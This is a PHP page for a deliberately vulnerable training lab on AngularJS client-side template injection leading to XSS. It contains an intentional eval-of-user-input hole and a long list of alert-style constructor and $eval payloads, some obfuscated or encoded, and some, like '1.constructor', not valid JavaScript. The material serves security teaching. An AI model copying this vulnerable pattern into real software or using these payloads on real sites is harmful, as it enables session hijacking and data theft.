<?php
// Lab 5: CSTI with XSS
// Vulnerability: CSTI leading to Cross-Site Scripting

session_start();

$message = '';
$user_input = '';
$template_output = '';

// Simulate CSTI leading to XSS
function process_csti_xss($input) {
    // Vulnerable: Direct template processing without validation
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct template processing without encoding
    return $input;
}

// Handle CSTI leading to XSS
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['process_template'])) {
    $user_input = $_POST['template_input'] ?? '';
    
    if ($user_input) {
        $template_output = process_csti_xss($user_input);
        $message = '<div class="alert alert-success">Template processed successfully!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 5: CSTI with XSS - Client-side Template Injection Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    <script src="https://cdn.jsdelivr.net/npm/angular@1.8.2/angular.min.js"></script>
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .template-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .xss-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body ng-app="cstiApp" ng-controller="cstiController">
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to CSTI Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 5: CSTI with XSS</h1>
            <p class="hero-subtitle">CSTI leading to Cross-Site Scripting</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates CSTI vulnerabilities that lead to Cross-Site Scripting (XSS) attacks. Client-side template injection can be used to execute arbitrary JavaScript code, leading to session hijacking, data theft, and other security issues.</p>
            <p><strong>Objective:</strong> Use CSTI to achieve XSS and demonstrate the security impact.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Direct template processing without validation
function process_csti_xss($input) {
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct template processing without encoding
    return $input;
}

// Angular template (vulnerable to XSS)
&lt;div ng-bind-html="userInput"&gt;&lt;/div&gt;
&lt;div&gt;{{ userInput }}&lt;/div&gt;
&lt;div ng-bind="userInput"&gt;&lt;/div&gt;</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-exclamation-triangle me-2"></i>CSTI XSS Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="xss-warning">
                            <h5>⚠️ XSS Warning</h5>
                            <p>This lab demonstrates XSS via CSTI. The following can execute JavaScript:</p>
                            <ul>
                                <li><code>{{ $eval('alert(1)') }}</code> - Direct code execution</li>
                                <li><code>{{ constructor.constructor('alert(1)')() }}</code> - Constructor injection</li>
                                <li><code>{{ [].constructor.constructor('alert(1)')() }}</code> - Array bypass</li>
                                <li><code>{{ 'a'.constructor.constructor('alert(1)')() }}</code> - String bypass</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>XSS Examples</h5>
                            <p>Try these XSS payloads:</p>
                            <ul>
                                <li><code>{{ $eval('alert(1)') }}</code> - Basic XSS</li>
                                <li><code>{{ constructor.constructor('alert(1)')() }}</code> - Constructor XSS</li>
                                <li><code>{{ [].constructor.constructor('alert(1)')() }}</code> - Array XSS</li>
                                <li><code>{{ 'a'.constructor.constructor('alert(1)')() }}</code> - String XSS</li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="process_template" value="1">
                            <div class="mb-3">
                                <label for="template_input" class="form-label">XSS Template Expression</label>
                                <textarea class="form-control" id="template_input" name="template_input" 
                                          rows="4" placeholder="Enter XSS template expression..."><?php echo htmlspecialchars($user_input); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Process Template</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Template Output
                    </div>
                    <div class="card-body">
                        <div class="template-display">
                            <h5>Angular Template Output (Vulnerable to XSS)</h5>
                            <div ng-bind-html="userInput"></div>
                            <div>{{ userInput }}</div>
                            <div ng-bind="userInput"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> CSTI with XSS</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> CSTI leading to XSS</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>XSS Attack Types</h5>
                    <ul>
                        <li><strong>Direct Execution:</strong> $eval() function calls</li>
                        <li><strong>Constructor Injection:</strong> constructor.constructor()</li>
                        <li><strong>Array Bypass:</strong> [].constructor.constructor()</li>
                        <li><strong>String Bypass:</strong> 'a'.constructor.constructor()</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>CSTI XSS Payloads</h5>
            <p>Use these payloads to achieve XSS via Client-side Template Injection:</p>
            
            <h6>1. Basic XSS via Eval:</h6>
            <div class="code-block">{{ $eval('alert(1)') }}
{{ $eval('console.log(1)') }}
{{ $eval('document.write(1)') }}
{{ $eval('window.alert(1)') }}</div>

            <h6>2. Constructor Injection XSS:</h6>
            <div class="code-block">{{ constructor.constructor('alert(1)')() }}
{{ constructor.constructor('console.log(1)')() }}
{{ constructor.constructor('document.write(1)')() }}
{{ constructor.constructor('window.alert(1)')() }}</div>

            <h6>3. Array Bypass XSS:</h6>
            <div class="code-block">{{ [].constructor.constructor('alert(1)')() }}
{{ [].constructor.constructor('console.log(1)')() }}
{{ [].constructor.constructor('document.write(1)')() }}
{{ [].constructor.constructor('window.alert(1)')() }}</div>

            <h6>4. String Bypass XSS:</h6>
            <div class="code-block">{{ 'a'.constructor.constructor('alert(1)')() }}
{{ 'a'.constructor.constructor('console.log(1)')() }}
{{ 'a'.constructor.constructor('document.write(1)')() }}
{{ 'a'.constructor.constructor('window.alert(1)')() }}</div>

            <h6>5. Number Bypass XSS:</h6>
            <div class="code-block">{{ 1.constructor.constructor('alert(1)')() }}
{{ 1.constructor.constructor('console.log(1)')() }}
{{ 1.constructor.constructor('document.write(1)')() }}
{{ 1.constructor.constructor('window.alert(1)')() }}</div>

            <h6>6. Boolean Bypass XSS:</h6>
            <div class="code-block">{{ true.constructor.constructor('alert(1)')() }}
{{ true.constructor.constructor('console.log(1)')() }}
{{ true.constructor.constructor('document.write(1)')() }}
{{ true.constructor.constructor('window.alert(1)')() }}</div>

            <h6>7. Function Bypass XSS:</h6>
            <div class="code-block">{{ (function(){}).constructor.constructor('alert(1)')() }}
{{ (function(){}).constructor.constructor('console.log(1)')() }}
{{ (function(){}).constructor.constructor('document.write(1)')() }}
{{ (function(){}).constructor.constructor('window.alert(1)')() }}</div>

            <h6>8. Object Bypass XSS:</h6>
            <div class="code-block">{{ {}.constructor.constructor('alert(1)')() }}
{{ {}.constructor.constructor('console.log(1)')() }}
{{ {}.constructor.constructor('document.write(1)')() }}
{{ {}.constructor.constructor('window.alert(1)')() }}</div>

            <h6>9. Date Bypass XSS:</h6>
            <div class="code-block">{{ Date.constructor.constructor('alert(1)')() }}
{{ Date.constructor.constructor('console.log(1)')() }}
{{ Date.constructor.constructor('document.write(1)')() }}
{{ Date.constructor.constructor('window.alert(1)')() }}</div>

            <h6>10. Math Bypass XSS:</h6>
            <div class="code-block">{{ Math.constructor.constructor('alert(1)')() }}
{{ Math.constructor.constructor('console.log(1)')() }}
{{ Math.constructor.constructor('document.write(1)')() }}
{{ Math.constructor.constructor('window.alert(1)')() }}</div>

            <h6>11. JSON Bypass XSS:</h6>
            <div class="code-block">{{ JSON.constructor.constructor('alert(1)')() }}
{{ JSON.constructor.constructor('console.log(1)')() }}
{{ JSON.constructor.constructor('document.write(1)')() }}
{{ JSON.constructor.constructor('window.alert(1)')() }}</div>

            <h6>12. RegExp Bypass XSS:</h6>
            <div class="code-block">{{ RegExp.constructor.constructor('alert(1)')() }}
{{ RegExp.constructor.constructor('console.log(1)')() }}
{{ RegExp.constructor.constructor('document.write(1)')() }}
{{ RegExp.constructor.constructor('window.alert(1)')() }}</div>

            <h6>13. Error Bypass XSS:</h6>
            <div class="code-block">{{ Error.constructor.constructor('alert(1)')() }}
{{ Error.constructor.constructor('console.log(1)')() }}
{{ Error.constructor.constructor('document.write(1)')() }}
{{ Error.constructor.constructor('window.alert(1)')() }}</div>

            <h6>14. Promise Bypass XSS:</h6>
            <div class="code-block">{{ Promise.constructor.constructor('alert(1)')() }}
{{ Promise.constructor.constructor('console.log(1)')() }}
{{ Promise.constructor.constructor('document.write(1)')() }}
{{ Promise.constructor.constructor('window.alert(1)')() }}</div>

            <h6>15. Obfuscated XSS Payloads:</h6>
            <div class="code-block">{{ $eval('ale' + 'rt(1)') }}
{{ constructor.constructor('ale' + 'rt(1)')() }}
{{ [].constructor.constructor('ale' + 'rt(1)')() }}
{{ 'a'.constructor.constructor('ale' + 'rt(1)')() }}</div>

            <h6>16. Encoded XSS Payloads:</h6>
            <div class="code-block">{{ $eval('\x61\x6c\x65\x72\x74(1)') }}
{{ constructor.constructor('\x61\x6c\x65\x72\x74(1)')() }}
{{ [].constructor.constructor('\x61\x6c\x65\x72\x74(1)')() }}
{{ 'a'.constructor.constructor('\x61\x6c\x65\x72\x74(1)')() }}</div>

            <h6>17. Unicode XSS Payloads:</h6>
            <div class="code-block">{{ $eval('\u0061\u006c\u0065\u0072\u0074(1)') }}
{{ constructor.constructor('\u0061\u006c\u0065\u0072\u0074(1)')() }}
{{ [].constructor.constructor('\u0061\u006c\u0065\u0072\u0074(1)')() }}
{{ 'a'.constructor.constructor('\u0061\u006c\u0065\u0072\u0074(1)')() }}</div>

            <h6>18. String.fromCharCode XSS Payloads:</h6>
            <div class="code-block">{{ $eval(String.fromCharCode(97,108,101,114,116,40,49,41)) }}
{{ constructor.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))() }}
{{ [].constructor.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))() }}
{{ 'a'.constructor.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))() }}</div>

            <h6>19. Advanced XSS Payloads:</h6>
            <div class="code-block">{{ $eval('$eval("alert(1)")') }}
{{ constructor.constructor('constructor.constructor("alert(1)")()')() }}
{{ [].constructor.constructor('[].constructor.constructor("alert(1)")()')() }}
{{ 'a'.constructor.constructor('"a".constructor.constructor("alert(1)")()')() }}</div>

            <h6>20. Ultimate XSS Payloads:</h6>
            <div class="code-block">{{ $eval('$eval("ale" + "rt(1)")') }}
{{ constructor.constructor('constructor.constructor("ale" + "rt(1)")()')() }}
{{ [].constructor.constructor('[].constructor.constructor("ale" + "rt(1)")()')() }}
{{ 'a'.constructor.constructor('"a".constructor.constructor("ale" + "rt(1)")()')() }}</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Cross-Site Scripting (XSS) attacks</li>
                <li>Session hijacking and account takeover</li>
                <li>Data theft and sensitive information disclosure</li>
                <li>Malicious redirects and phishing attacks</li>
                <li>Keylogging and form hijacking</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper input validation and sanitization</li>
                    <li>Use Content Security Policy (CSP) to prevent code execution</li>
                    <li>Implement proper output encoding</li>
                    <li>Use whitelist-based filtering for allowed template expressions</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual template processing patterns</li>
                    <li>Use Angular's built-in sanitization features</li>
                    <li>Implement proper template sandboxing</li>
                    <li>Use Web Application Firewall (WAF) to detect XSS attempts</li>
                    <li>Implement proper session management and CSRF protection</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        var app = angular.module('cstiApp', []);
        app.controller('cstiController', function($scope, $sce) {
            $scope.userInput = '<?php echo addslashes($template_output); ?>';
            
            // Vulnerable: Direct template processing without sanitization
            $scope.$watch('userInput', function(newValue) {
                if (newValue) {
                    // Vulnerable: Direct evaluation without validation
                    try {
                        $scope.processedValue = $scope.$eval(newValue);
                    } catch (e) {
                        $scope.processedValue = 'Error: ' + e.message;
                    }
                }
            });
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
